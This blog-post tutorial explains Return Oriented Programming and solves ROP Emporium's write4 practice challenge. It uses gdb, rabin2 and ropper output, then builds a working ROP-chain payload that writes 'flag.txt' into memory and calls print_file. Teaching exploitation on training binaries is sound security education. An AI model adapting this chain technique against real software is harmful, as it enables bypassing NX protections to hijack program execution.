---
layout: post
title: "Return Oriented Programming Tutorial"
date: 2020-10-14
---

In this blog post, I will be explaining how you can make use of Return Oriented Programming (ROP) gadgets in order to obtain execute code when NX is enabled. I will also be solving one of ROP Emporium's challenges by using a ROP chain.

### What is NX?

The NX bit stands for the "no-execute" bit, and it allows computers to mark certain sections of code as executable or non executable. If the process attempts to execute code that is marked as executable, then there will be no problems, but if the process attempts to execute code that is marked as non-executable, then the processor will refuse to execute that line of code.

In a typical stack overflow, the attacker "injects" shellcode into the stack, and then he/she overwrites the return address on the stack with a JMP RSP instruction. However, when NX is enabled, the stack is typically marked as non-executable, which means that we cannot simply place shellcode on the stack.

### What are ROP Chains?

Suppose we have a binary with NX enabled, and we have already figured out how to overwrite the return address and control RIP via buffer overflow. ROP chains will allow us to get around the problems that NX cause. The way this works is, we will make RIP point to a line of assembly code that is marked as executable in the binary instead of simply injecting our shellcode into the running process.

Since we have complete control over RIP, we can theoretically make the program jump to any address in the binary, but we will want to specifcally focus on finding one or a few lines of code in the program that end with a RET instruction. These lines of code will be referred to as a "ROP gadget." Since each ROP gadget ends with a RET instruction, and since we can overwrite the return address multiple times, we can "chain" multiple ROP gadgets together to execute the code that we want.

Don't worry if this doesn't really make sense to you yet. It will make more sense when you look at an example.

### A Basic Example

I will be using [ROP Emporium's Write4 Challenge](https://ropemporium.com/challenge/write4.html) in 64-bit as our target. When we run the target, we are given the following:

```bash
$ ./write4 
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

> AAAAAAAAAAAAAAA
Thank you!
```

We are able to overwrite the return address of the target after writing 40 bytes via buffer overflow.

```bash
$ python -c "print('A'*40 + 'BBBBBBBB')" > input
$ gdb write4 
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
78 commands loaded for GDB 9.2 using Python engine 3.8
[*] 2 commands could not be loaded, run `gef missing` to know why.
/home/n/.gdbinit:2: Error in sourced command file:
source command requires file name of file to source.
Reading symbols from write4...
(No debugging symbols found in write4)
gef➤  r < input
Starting program: /home/n/Documents/Exploitation/ropemporium/write4/write4 < input
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

> Thank you!

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7dc7942 in pwnme () from ./libwrite4.so
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xb               
$rbx   : 0x0000000000400630  →  <__libc_csu_init+0> push r15
$rcx   : 0x00007ffff7cbf1e7  →  0x5177fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007fffffffdd98  →  "BBBBBBBB"
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00007ffff7d9a723  →  0xd9c4c0000000000a
$rdi   : 0x00007ffff7d9c4c0  →  0x0000000000000000
$rip   : 0x00007ffff7dc7942  →  <pwnme+152> ret 
$r8    : 0xb               
$r9    : 0x2               
$r10   : 0x00007ffff7dc74c9  →  0x6972700064616572 ("read"?)
$r11   : 0x246             
$r12   : 0x0000000000400520  →  <_start+0> xor ebp, ebp
$r13   : 0x00007fffffffde90  →  0x0000000000000001
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdd98│+0x0000: "BBBBBBBB"	 ← $rsp
0x00007fffffffdda0│+0x0008: 0x000000000000000a
0x00007fffffffdda8│+0x0010: 0x00007ffff7bd50b3  →  <__libc_start_main+243> mov edi, eax
0x00007fffffffddb0│+0x0018: 0x00007ffff7ffc620  →  0x0005043c00000000
0x00007fffffffddb8│+0x0020: 0x00007fffffffde98  →  0x00007fffffffe21b  →  "/home/n/Documents/Exploitation/ropemporium/write4/[...]"
0x00007fffffffddc0│+0x0028: 0x0000000100000000
0x00007fffffffddc8│+0x0030: 0x0000000000400607  →  <main+0> push rbp
0x00007fffffffddd0│+0x0038: 0x0000000000400630  →  <__libc_csu_init+0> push r15
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7dc793b <pwnme+145>      call   0x7ffff7dc7730 <puts@plt>
   0x7ffff7dc7940 <pwnme+150>      nop    
   0x7ffff7dc7941 <pwnme+151>      leave  
 → 0x7ffff7dc7942 <pwnme+152>      ret    
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "write4", stopped, reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7ffff7dc7942 → pwnme()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤ 
```

By looking at the Rop Emporium website, we see that we are given the following information:
- There is a function called `print_file(char* filename)`.
- This function has been moved into a separate library, but a PLT entry for that function exists in the binary.
- Our goal is to call `print_file("flag.txt")`.
- You can input NULL bytes into the program, and the program will read them just fine.

Note that NX is enabled, so we can't just execute a `JMP RSP` instruction and put shellcode on the stack.
```bash
$ rabin2 -I write4
arch     x86
baddr    0x400000
binsz    6521
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    .
sanitiz  false
static   false
stripped false
subsys   linux
va       true
```

The `print_file(char *filename)` function, as we can see using rabin2, has a PLT entry that is located at `0x00400510`.
```bash
$ rabin2 -i write4
[Imports]
nth vaddr      bind   type   name
―――――――――――――――――――――――――――――――――
1   0x00400500 GLOBAL FUNC   pwnme
2   0x00000000 GLOBAL FUNC   __libc_start_main
3   0x00000000 WEAK   NOTYPE __gmon_start__
4   0x00400510 GLOBAL FUNC   print_file
```
This means that we have two steps that we need to accomplish:
1. Load a pointer to the string "flag.txt" into RDI (in x86-64, RDI contains the first argument to a function).
2. Overwrite the return address with `0x00400510` to call `print_file("flag.txt")`.

Unfortunately, there are no useful strings in the binary. This means that we need to somehow inject the "flag.txt" string into the process.
```bash
$ rabin2 -z write4
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x000006b4 0x004006b4 11  12   .rodata ascii nonexistent
```

### Writing the String

Using rabin2, we can see that there are several writeable sections in the binary. We can write our "flag.txt" string in the `.data` section, which is writeable and is located at `0x00601028`. Theoretically, the `.bss` section should also work just fine.
```bash
$ rabin2 -S write4
[Sections]

nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000    0x0 0x00000000    0x0 ---- 
1   0x00000238   0x1c 0x00400238   0x1c -r-- .interp
2   0x00000254   0x20 0x00400254   0x20 -r-- .note.ABI_tag
3   0x00000274   0x24 0x00400274   0x24 -r-- .note.gnu.build_id
4   0x00000298   0x38 0x00400298   0x38 -r-- .gnu.hash
5   0x000002d0   0xf0 0x004002d0   0xf0 -r-- .dynsym
6   0x000003c0   0x7c 0x004003c0   0x7c -r-- .dynstr
7   0x0000043c   0x14 0x0040043c   0x14 -r-- .gnu.version
8   0x00000450   0x20 0x00400450   0x20 -r-- .gnu.version_r
9   0x00000470   0x30 0x00400470   0x30 -r-- .rela.dyn
10  0x000004a0   0x30 0x004004a0   0x30 -r-- .rela.plt
11  0x000004d0   0x17 0x004004d0   0x17 -r-x .init
12  0x000004f0   0x30 0x004004f0   0x30 -r-x .plt
13  0x00000520  0x182 0x00400520  0x182 -r-x .text
14  0x000006a4    0x9 0x004006a4    0x9 -r-x .fini
15  0x000006b0   0x10 0x004006b0   0x10 -r-- .rodata
16  0x000006c0   0x44 0x004006c0   0x44 -r-- .eh_frame_hdr
17  0x00000708  0x120 0x00400708  0x120 -r-- .eh_frame
18  0x00000df0    0x8 0x00600df0    0x8 -rw- .init_array
19  0x00000df8    0x8 0x00600df8    0x8 -rw- .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- .got
22  0x00001000   0x28 0x00601000   0x28 -rw- .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- .data
24  0x00001038    0x0 0x00601038    0x8 -rw- .bss
25  0x00001038   0x29 0x00000000   0x29 ---- .comment
26  0x00001068  0x618 0x00000000  0x618 ---- .symtab
27  0x00001680  0x1f6 0x00000000  0x1f6 ---- .strtab
28  0x00001876  0x103 0x00000000  0x103 ---- .shstrtab
```

"flag.txt" written as a Python byte array is `b'\x66\x6c\x61\x67\x2e\x74\x78\x74'`.

```bash
$ python
Python 3.8.5 (default, Jul 28 2020, 12:59:40) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> a = "flag.txt"
>>> a.encode(encoding='utf-8').hex()
'666c61672e747874'
```

Now we know that we need to write the bytes `0x66 0x6c 0x61 0x67 0x2e 0x74 0x78 0x74` ("flag.txt" written in hex) at memory location `0x00601028`. Alright, so how do we actually accomplish this? The first step would be to search for some code in the binary that is in the form `mov [%], %; ret`. If we could find code that does this, then we could write the hex bytes for "flag.txt" at memory location `0x00601028` by modifying the registers accordingly and jumping to that line of code.

We can find a line of code in this form by using a tool called ropper. Ropper allows us to easily find ROP gadgets in binaries that we can use.
```bash
$ ropper --file write4 --search "mov [%], %; ret"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: mov [%], %; ret

[INFO] File: write4
0x00000000004005e2: mov byte ptr [rip + 0x200a4f], 1; pop rbp; ret; 
0x0000000000400606: mov dword ptr [rbp + 0x48], edx; mov ebp, esp; call 0x500; mov eax, 0; pop rbp; ret; 
0x0000000000400629: mov dword ptr [rsi], edi; ret; 
0x0000000000400628: mov qword ptr [r14], r15; ret;
```

The `mov qword ptr [r14], r15; ret` at line `0x0000000000400628` seems perfect for us! Now, we just need to find a way to modify the registers so that `r14` is equal to `0x00601028` and `r15` is equal to `0x666c61672e747874`. We could do this by searching for a `pop r14` instruction and a `pop r15` instruction.

```bash
$ ropper --file write4 --search "pop r14%; ret"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop r14%; ret

[INFO] File: write4
0x0000000000400690: pop r14; pop r15; ret;
```

Luckily for us, in this scenario the `pop r14` and `pop r15` instructions were right next to each other. This means that we can put both of their values on the stack without needing another ROP gadget (recall that since our input buffer is on the stack, we can add more and more addresses on the stack).

So far, our stack buffer overflow should look like this:
- "A" written 40 times.
- `0x0000000000400690`, which will make the program jump to the `pop r14; pop r15; ret` instructions.
- `0x0000000000601028`, which will set `r14` to the memory location where we are writing our string.
- `0x666c61672e747874`, which will set `r15` to "flag.txt" written in ASCII.
- `0x0000000000400628`, which will jump to the `mov qword ptr [r14], r15; ret;` instruction after we have set `r14` and `r15`.

This gives us the following input (which won't work yet).

```python
python -c "import sys; sys.stdout.buffer.write(b'A'*40 + b'\x90\x06\x40\x00\x00\x00\x00\x00' + b'\x28\x10\x60\x00\x00\x00\x00\x00' + b'\x66\x6c\x61\x67\x2e\x74\x78\x74' + b'\x28\x06\x40\x00\x00\x00\x00\x00')" | ./write4
```

In case you still don't understand why this works, here is what is actually going on:
1. Because of the buffer overflow, RIP is overwritten with `0x0000000000400690`, which is the location of the `pop r14; pop r15; ret` ROP gadget.
2. When `pop r14` is executed, we will get `0x0000000000601028` in `r14`.
3. When `pop r15` is executed, we will get `0x666c61672e747874` in `r15`.
4. After that, `0x0000000000400628` is on the stack, which means that the `RET` instruction will jump to that location.
5. The next ROP gadget that we execute contains `mov qword ptr [r14], r15;`, which moves our copies our string into the location that `r14` points to.

We still need to do the following for the exploit to work:
1. Set `rdi` to `0x00601028` (recall that the first parameter to a function is in `rdi` for x86-64 binaries)
2. Jump to `print_file()`

### Calling the Function

Using ropper, we can find a way for us to modify `rdi` the same way we modified `r14` and `r15`.
```bash
$ ropper --file write4 --search "pop rdi; ret"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi; ret

[INFO] File: write4
0x0000000000400693: pop rdi; ret;
```

If we jump to this ROP gadget and add `0x0000000000601028` onto the stack, then when the `pop rdi` instruction is executed, we will have `rdi` point to the location of our string. From there, we can add `0x0000000000400510` to the stack, which is the location of the PLT entry for `print_file(char *filename)`. When the `RET` instruction is executed, we will call `print_file("flag.txt")`, which will solve the problem!

Our stack should now look like the following:
- "A" written 40 times.
- `0x0000000000400690`, which will make the program jump to the `pop r14; pop r15; ret` instructions.
- `0x0000000000601028`, which will set `r14` to the memory location where we are writing our string.
- `0x666c61672e747874`, which will set `r15` to "flag.txt" written in ASCII.
- `0x0000000000400628`, which will jump to the `mov qword ptr [r14], r15; ret;` instruction after we have set `r14` and `r15`.
- `0x0000000000400693`, which will jump to the `pop rdi; ret` instruction.
- `0x0000000000601028`, which will set `rdi` to the memory location where we wrote our string.
- `0x0000000000400510`, which will execute `print_file("flag.txt")`

This gives us the following:
```bash
$ python -c "import sys; sys.stdout.buffer.write(b'A'*40 + b'\x90\x06\x40\x00\x00\x00\x00\x00' + b'\x28\x10\x60\x00\x00\x00\x00\x00' + b'\x66\x6c\x61\x67\x2e\x74\x78\x74' + b'\x28\x06\x40\x00\x00\x00\x00\x00' + b'\x93\x06\x40\x00\x00\x00\x00\x00' + b'\x28\x10\x60\x00\x00\x00\x00\x00' + b'\x10\x05\x40\x00\x00\x00\x00\x00')" | ./write4 
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

> Thank you!
ROPE{a_placeholder_32byte_flag!}
```

This will successfully execute our ROP chain and print out our flag!

{% include related_posts.html %}
